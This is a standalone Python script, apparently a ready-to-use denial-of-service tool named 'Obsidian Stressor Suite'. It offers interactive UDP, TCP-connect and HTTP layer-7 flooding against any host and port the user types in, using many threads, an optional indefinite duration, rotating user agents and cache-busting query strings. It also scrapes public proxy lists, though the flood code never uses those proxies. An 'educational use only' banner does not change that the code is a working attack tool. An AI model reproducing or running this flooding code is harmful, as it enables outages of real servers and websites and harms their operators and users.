#!/usr/bin/env python3
import socket
import threading
import random
import time
import sys
import os
import urllib.request
import re

class ObsidianTheme:
    HEADER = "\033[95m"
    CYAN = "\033[96m"
    GREEN = "\033[92m"
    YELLOW = "\033[93m"
    RED = "\033[91m"
    WHITE = "\033[97m"
    BOLD = "\033[1m"
    DARK = "\033[90m"
    END = "\033[0m"

user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
]

stop_flag = False
stats_lock = threading.Lock()
packets_sent = 0
total_packets = 0
error_count = 0
proxies = []

def banner():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(f"{ObsidianTheme.DARK}=================================================================={ObsidianTheme.END}")
    print(f"  {ObsidianTheme.RED}{ObsidianTheme.BOLD}O B S I D I A N   -   S T R E S S O R   S U I T E{ObsidianTheme.END}")
    print(f"  {ObsidianTheme.CYAN}Advanced Multi-Protocol Network Testing & Stress Tool{ObsidianTheme.END}")
    print(f"  {ObsidianTheme.YELLOW}[!] AUTHORIZED STRESS TESTING AND EDUCATIONAL USE ONLY{ObsidianTheme.END}")
    print(f"{ObsidianTheme.DARK}=================================================================={ObsidianTheme.END}\n")

banner()

# Proxy Scraper Module
def fetch_proxies(limit):
    global proxies
    print(f"{ObsidianTheme.YELLOW}[*] Fetching and validating proxies...{ObsidianTheme.END}")
    sources = [
        "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt",
        "https://raw.githubusercontent.com/hookzof/socks5_list/master/proxy.txt"
    ]
    raw_list = []
    for src in sources:
        try:
            req = urllib.request.Request(src, headers={'User-Agent': 'Mozilla/5.0'})
            with urllib.request.urlopen(req, timeout=5) as resp:
                found = re.findall(r'\d+.\d+.\d+.\d+:\d+', resp.read().decode('utf-8', errors='ignore'))
                raw_list.extend(found)
        except:
            continue

    raw_list = list(set(raw_list))
    verified = []
    
    def test_p(p):
        if len(verified) >= limit: return
        try:
            ip, port = p.split(':')
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.settimeout(1.5)
                if s.connect_ex((ip, int(port))) == 0:
                    with stats_lock:
                        if len(verified) < limit:
                            verified.append((ip, int(port)))
        except:
            pass

    threads = []
    random.shuffle(raw_list)
    for p in raw_list[:250]:
        if len(verified) >= limit: break
        t = threading.Thread(target=test_p, args=(p,), daemon=True)
        t.start()
        threads.append(t)
    for t in threads:
        t.join(timeout=0.1)

    proxies = verified[:limit]
    print(f"{ObsidianTheme.GREEN}[+] Successfully loaded {len(proxies)} live proxies.{ObsidianTheme.END}")

# Configuration Prompts
print(f"{ObsidianTheme.CYAN}[?] Select Attack Protocol / Vector:{ObsidianTheme.END}")
print(f"1. UDP Flood (Game Servers / VoIP / High Volumetric)")
print(f"2. TCP Connect Flood (Connection Pool Exhaustion)")
print(f"3. HTTP Layer 7 Flood (Web Application Stress)")
protocol_choice = input(f"{ObsidianTheme.BOLD}Choice (1-3) -> {ObsidianTheme.END}").strip()

use_proxy_input = input(f"{ObsidianTheme.YELLOW}[?] Enable Proxy Routing? (y/n): {ObsidianTheme.END}").strip().lower()
if use_proxy_input == 'y':
    p_count = int(input(f"{ObsidianTheme.CYAN}Proxy Count Limit (e.g., 50): {ObsidianTheme.END}") or 50)
    fetch_proxies(p_count)

raw_host = input(f"{ObsidianTheme.RED}[!] Target Host / IP: {ObsidianTheme.END}").strip()
try:
    target_ip = socket.gethostbyname(raw_host)
    target_port = int(input(f"{ObsidianTheme.RED}[!] Target Port: {ObsidianTheme.END}") or 80)
except:
    sys.exit(f"{ObsidianTheme.RED}[!] Error: Invalid target host or port resolution.{ObsidianTheme.END}")

threads_count = int(input(f"{ObsidianTheme.YELLOW}[?] Threads / Workers (default 150): {ObsidianTheme.END}") or 150)
duration = int(input(f"{ObsidianTheme.YELLOW}[?] Duration in seconds (0 = Infinite): {ObsidianTheme.END}") or 0)

# Attack Engine Workers
def stress_worker():
    global packets_sent, total_packets, error_count
    
    if protocol_choice == "1":
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        payload = os.urandom(1024)
        while not stop_flag:
            try:
                sock.sendto(payload, (target_ip, target_port))
                with stats_lock:
                    packets_sent += 1
                    total_packets += 1
            except:
                with stats_lock: error_count += 1
                time.sleep(0.01)
        sock.close()

    elif protocol_choice == "2":
        while not stop_flag:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(1.5)
                s.connect((target_ip, target_port))
                s.close()
                with stats_lock:
                    packets_sent += 1
                    total_packets += 1
            except:
                with stats_lock: error_count += 1
                time.sleep(0.01)

    elif protocol_choice == "3":
        while not stop_flag:
            try:
                ua = random.choice(user_agents)
                req_path = f"/?id={random.randint(1, 999999)}"
                http_payload = (
                    f"GET {req_path} HTTP/1.1\r\n"
                    f"Host: {raw_host}\r\n"
                    f"User-Agent: {ua}\r\n"
                    f"Connection: close\r\n\r\n"
                ).encode('utf-8')
                
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(2.0)
                s.connect((target_ip, target_port))
                s.sendall(http_payload)
                s.close()
                with stats_lock:
                    packets_sent += 1
                    total_packets += 1
            except:
                with stats_lock: error_count += 1
                time.sleep(0.01)

def monitor():
    global packets_sent
    while not stop_flag:
        time.sleep(1.0)
        with stats_lock:
            pps = packets_sent
            packets_sent = 0
            sys.stdout.write(
                f"\r{ObsidianTheme.GREEN}[STATUS] PPS: {pps:,} | "
                f"Total: {total_packets:,} | Errors: {error_count:,}{ObsidianTheme.END}    "
            )
            sys.stdout.flush()

print(f"\n{ObsidianTheme.BOLD}{ObsidianTheme.RED}>>> OBSIDIAN STRESS ENGINE DISPATCHED TO {target_ip}:{target_port} <<<{ObsidianTheme.END}\n")
threading.Thread(target=monitor, daemon=True).start()

worker_threads = []
for _ in range(threads_count):
    t = threading.Thread(target=stress_worker, daemon=True)
    t.start()
    worker_threads.append(t)

try:
    if duration > 0:
        time.sleep(duration)
    else:
        while True: time.sleep(1)
except KeyboardInterrupt:
    pass
finally:
    stop_flag = True
    print(f"\n{ObsidianTheme.YELLOW}[!] Gracefully halting engine...{ObsidianTheme.END}")
    time.sleep(1)
